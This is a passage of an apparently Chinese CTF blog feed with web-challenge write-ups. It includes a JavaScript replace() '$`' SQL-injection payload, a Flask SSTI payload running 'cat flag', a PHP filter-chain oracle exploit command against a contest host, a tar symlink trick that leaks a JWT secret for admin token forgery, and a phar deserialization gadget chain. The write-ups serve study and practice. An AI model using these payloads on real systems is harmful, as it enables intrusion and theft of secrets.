class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后是第二个waf，匹配的是 info 里的<code>&#39;</code>，<code>&quot;</code>，<code>\\</code></p><p>要想注入的话肯定要一个<code>&#39;</code>或者<code>\</code>来转义，</p><p>期望的sql语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'1\' and password = '</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;1&#39;&#39; and password &#x3D; &#39;;select 1--&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是测了半天都转义不出想要的效果</p><br><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>估计是要从 replace 入手，模板字符串替换的写法感觉有说法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看一下replace的源码：</p><pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">/** * Replaces text in a string, using this regular expression. * @param string A String object or string literal whose contents matching against *               this regular expression will be replaced * @param replacer A function that returns the replacement text. */</span><span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>replace<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token function-variable function">replacer</span><span class="token operator">:</span> <span class="token punctuation">(</span>substring<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>replace 支持正则表达式，在MDN文档里能找到内置的正则静态属性：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext</a></p><blockquote><p><strong>leftContext</strong> 非标准属性是正则表达式的静态和只读属性，含有最新匹配的左侧子串。 RegExp.$&#96; 是这个属性的别名。</p></blockquote><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">RegExp<span class="token punctuation">.</span>leftContextRegExp<span class="token punctuation">[</span><span class="token string">'$`'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> sql <span class="token operator">=</span> <span class="token string">"select * from userinfo where username = '&#123;username&#125;' and password = '&#123;password&#125;'"</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;username&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#123;password&#125;"</span><span class="token punctuation">,</span> <span class="token string">"$`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>返回</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就拿到我们需要的<code>&#39;</code>了</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from userinfo where username &#x3D; &#39;select * from userinfo where username &#x3D; &#39;&#39; and password &#x3D; &#39;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后构造注入得到payload：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"$`"</span>%2C<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"or 1%23"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> userinfo <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'select * from userinfo where username = '' and password = '</span><span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165020071.png" alt="image-20250118165020071"></p><p>然后就会下载到flag了（这里可以知道数据库不是sqlite，sqlite的注释符是<code>--</code>）</p><p><img src="/blog/2025/01/18/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118174053483.png" alt="image-20250118174053483"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;所以 已经没事了😄&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/uuzeray/article/details/145228235&quot;&gt;https://blog.csdn.net/uuzeray/article/details/145228235&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>2024春秋杯冬季赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2025-01-17T02:31:51.000Z</published>
    <updated>2025-01-19T11:35:37.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你什么比赛你撞西湖论剑（</p><p>day2的题没做，放着不管！</p><span id="more"></span><hr><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h1><p>直接ssti秒了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h1><p>文件复制，支持伪协议，但是除了文件大小就没有其他回显，测出来 flag 在&#x2F;flag</p><p>那明显是侧信道盲注</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> http://eci-2ze470339l9n5s7flrul.cloudeci1.ichunqiu.com/ <span class="token parameter variable">--parameter</span> path <span class="token parameter variable">--file</span> /flag <span class="token parameter variable">--time_based_atta</span>ck True <span class="token parameter variable">--match</span> <span class="token string">"Allowed memory size"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117111643538.png" alt="image-20250117111643538"></p><hr><h1 id="Gotar（复现）"><a href="#Gotar（复现）" class="headerlink" title="Gotar（复现）"></a>Gotar（复现）</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"Gotar/config"</span><span class="token string">"Gotar/controllers"</span><span class="token string">"Gotar/db"</span><span class="token string">"Gotar/middleware"</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span><span class="token function">LoadEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>db<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">StripPrefix</span><span class="token punctuation">(</span><span class="token string">"/assets/"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"assets"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>IndexHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>RegisterHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LoginHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> controllers<span class="token punctuation">.</span>LogoutHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>UploadHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/files"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>FilesHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/download/"</span><span class="token punctuation">,</span> middleware<span class="token punctuation">.</span><span class="token function">AuthMiddleware</span><span class="token punctuation">(</span>controllers<span class="token punctuation">.</span>DownloadHandler<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Server started on http://localhost:80"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传功能是上传一个tar包并解压</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>uploadDir    <span class="token operator">=</span> <span class="token string">"./assets/uploads"</span>extractedDir <span class="token operator">=</span> <span class="token string">"./assets/extracted"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上传目录和解压目录</p><p>思路应该是先获取 .env 的 jwt_key，然后伪造成admin下载flag</p><p>思考 html&#x2F;template 的 ssti，但是没有注入点</p><p>那就文件上传，奇怪的是我用linux压缩的tar全部解压失败，原来是多加了个 z 参数（</p><p>尝试在 windows 这里压缩一个tar包，发现能上传解压了，但是下载全部失败</p><p>本地调试一下，我们上传文件时会执行这样一条sqlite语句</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE &#96;users&#96;.&#96;id&#96; &#x3D; 2 AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载时点击文件执行的url：<code>download/1/.env</code>，其sql语句是</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;1&#x2F;.env&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>1/.env</code>这玩意在 id 上明显是返回 false</p><p>那么这里说不定能构造sql注入，试了一下发现<code>&quot;</code>会自动补成对</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;&quot;&quot;)or+select+1--&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>遂放弃</p><p>观察下登录接口处的操作：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">result <span class="token operator">:=</span> db<span class="token punctuation">.</span>DB<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"username = ?"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE username &#x3D; &quot;123&quot;&quot;)))--&quot; AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也是没法注入的，于是注入似了</p><p>尝试软链接到 .env，但是解压就报错<code>Failed to extract file: symlink /app/.env assets/extracted/2: file exists</code>了，不懂</p><br><p>原来是因为软链接需要先套一层文件夹再上传，否则这里 assets&#x2F;extracted&#x2F;2 就直接指向 &#x2F;app&#x2F;.env 了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token function">ln</span><span class="token builtin class-name">cd</span> <span class="token function">ln</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /app/.env <span class="token builtin class-name">test</span><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> ln.tar <span class="token function">ln</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问静态目录 &#x2F;assets&#x2F;extracted&#x2F;2&#x2F;test 得到 .env</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">JWT_SECRET</span><span class="token operator">=</span>SfaVqVGfLOKk7Gp912kPe0Li47AEQM4iYNbBx1WVrWA<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来伪造admin即可，注意 UserID 也要改成 1</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224334850.png" alt="image-20250117224334850"></p><p>读flag</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224547947.png" alt="image-20250117224547947"></p><hr><h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h1><p>文件上传，flag就在web目录下，先看上传规则</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>";</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>白名单，结合题目描述可知要用phar打</p><p>看一下利用类：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 